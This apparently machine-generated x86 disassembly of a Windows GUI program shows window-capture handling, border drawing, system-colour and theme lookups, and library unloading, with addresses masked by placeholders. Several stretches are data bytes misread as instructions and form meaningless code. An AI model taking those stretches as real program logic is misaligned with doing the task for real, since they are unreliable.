mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42bd48
push ebx
push esi
mov esi eax
mov eax esi
call sub_43fb54
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_42c584
call sub_42c664
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42bdb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42b960
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_422678
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41dbec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4129b0
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_422678
pop edx
call sub_41dfc4
push 0x0
push edi
push 0x1
mov eax ebx
call sub_422678
mov edx eax
xor ecx ecx
mov eax esi
call sub_44ba3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42be40
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43fce4
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_42ba88
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b960
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44b524
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_42bdb0
pop ecx
sub_42befc
or al [ eax ]
add [ eax ] al
xor al 0x29
dec eax
add [ eax + 0x37 ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sub [ eax ] ecx
pushfd
xor eax 0x48
add [ eax ] al
sub al 0x29
dec eax
add [ eax ] bl
xor eax 0x48
add [ eax ] al
sub [ ecx ] ch
dec eax
add [ esi + esi + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] ah
dec eax
add [ edi + esi + 0x48 ] ch
add [ eax ] al
and [ ecx ] ch
dec eax
add [ eax + 0x483a ] ch
add [ eax ] al
add [ ecx + ebp ] bl
dec eax
add al bh
aaa
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sub [ eax ] ecx
mov ah 0x38
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] dl
dec eax
add [ eax + 0x3a ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] dl
sub [ eax ] ecx
inc esp
xor eax 0x48
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bfa4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bfab
retn
call sub_42bee0
sub_42bfd8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bffd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c004
retn
sub_42c01f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42c064
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c06b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404afc
sub_42c087
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42c0cc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c0d3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404afc
sub_42c0e3
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c139
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c140
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404074
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42c14c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c190
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c197
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42c1a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c1c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c1d0
retn
sub_42c1dc
sub dl al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
retn 0x42
sub_42c200
add al 0x0
add [ eax ] al
mov al [ 0xffffffffe8004010 ]
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
mov ah 0xc2
inc edx
add al cl
retn 0x42
sub_42c230
or edx [ ebx + eax * 2 + 0x6f ]
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push sub_42c34b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c352
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ab0
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ab0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42c2dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c34b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c352
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ab0
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ab0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42c5a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_426954
mov [ esi + 0x5 ] al
call sub_42c27c
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42cf1c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_42c5f0
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_42c690
call sub_426794
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42c624
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42c690
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42c6d4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42c724
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42c770
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42c7b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42c7fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42c624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42c864
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4048c0
push eax
mov eax esi
call sub_4048b0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42c624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42c8c8
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42c94c
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42c988
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42ca24
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42ca41 ]
jmp [ eax * 4 + jump_table_42caaa ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42cdb0
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42cf0b
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42c94c
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42c770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_4129b0
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42cf38
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cf73
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf7a
retn
mov eax [ rw-data ]
call sub_4032a0
mov eax rw-data
call sub_404074
sub_42cf84
ror bh 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
rol [ edx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
rol [ edx ] 0x1
mov dh 0xd0
inc edx
add [ eax ] dl
add al [ eax ]
add [ eax + 0x540043a0 ] al
test al 0x41
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add [ eax + 0x21 ] dh
inc esp
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sbb al 0x63
inc esp
add [ eax ] dl
push ecx
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
inc esp
inc ecx
add ah cl
inc [ ebx ]
enter 0x43d2 0x0
in al dx
add eax 0xdbe00044
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ edx + edx ] dl
inc ebx
add [ esp + ecx * 2 ] ah
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add ah cl
fadd [ ebx ]
loopne r-xdata
rol [ ebx ] 0x1
mov al dl
inc ebx
add [ esi + ebx * 8 + 0x200c0043 ] cl
inc esp
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc ebx
je r-xdata
je r-xdata
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ edi + edx + 0x43 ] bl
add [ ebp + ebp * 8 - 0x126fffbd ] dl
inc ebx
add [ eax - 0x12 ] ah
inc ebx
add [ ecx + edx * 8 ] bh
inc ebx
add [ eax - 0x1bffbc28 ] al
xlat
inc ebx
add [ ecx ] cl
inc ebx
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add [ ebx + ebx + 0x43 ] bh
add [ eax ] al
rol [ ebx ] cl
push esp
fld [ ebx ]
int3
insb
je r-xdata
insd
inc edi
jb r-xdata
outsd
js r-xdata
adc cl 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 + 0x42 ] dl
add [ edx + edx * 8 ] dh
inc ebx
add al ah
fild [ ebx ]
insb
test al 0x41
inc ebx
jb r-xdata
jne r-xdata
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ eax + 0x12 ] dh
inc ebx
add al bh
or al 0x44
add [ eax - 0x33ffbbe6 ] bl
adc al [ ebx ]
adc [ edi ] 0x44
add [ eax + 0x30004415 ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax - 0x14 ]
sbb [ eax + eax - 0x6c ] eax
sbb [ eax + eax + 0xc ] eax
inc esi
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] al
pop eax
inc esp
add [ eax + 0x78004442 ] cl
inc ebp
inc esp
add ah bl
adc al [ ebx ]
add al 0x0
push es
mov al 0x12
mov al 0x10
mov al 0x5
add [ eax + 0x18004316 ] bl
pop ss
inc ebx
add [ edi + edx ] ch
ror ah 0xd0
inc edx
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ ebp + 0x41 ] dl
inc ecx
jae r-xdata
nop
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 ] dl
outsd
insd
inc edi
jb r-xdata
jne r-xdata
inc edx
add [ eax - 0x2e ] al
inc edx
add [ ecx + eax - 0x60a00000 ] cl
inc ebx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add [ edx + esi * 8 ] ah
inc ebx
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
pushfd
pop eax
inc esp
add [ edi + edi * 8 ] al
inc ebx
add ah bh
inc ebx
add [ esp + eax * 2 ] dh
inc ecx
add [ edx + ebx + 0x43 ] dh
add [ esp + ebx + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xd2
inc edx
outsd
js r-xdata
inc ebx
add [ eax + 0x17 ] cl
inc ebx
add [ edi ] cl
push esp
inc ebx
jne r-xdata
sub al 0x17
iretd
sub_42df96
push ebx
je r-xdata
rol [ ebx ] cl
in al dx
inc ebx
je r-xdata
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add ah cl
fadd [ ebx ]
loopne r-xdata
rol [ ebx ] 0x1
mov al dl
inc ebx
add [ esi + ebx * 8 + 0x42d80043 ] cl
inc ebx
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
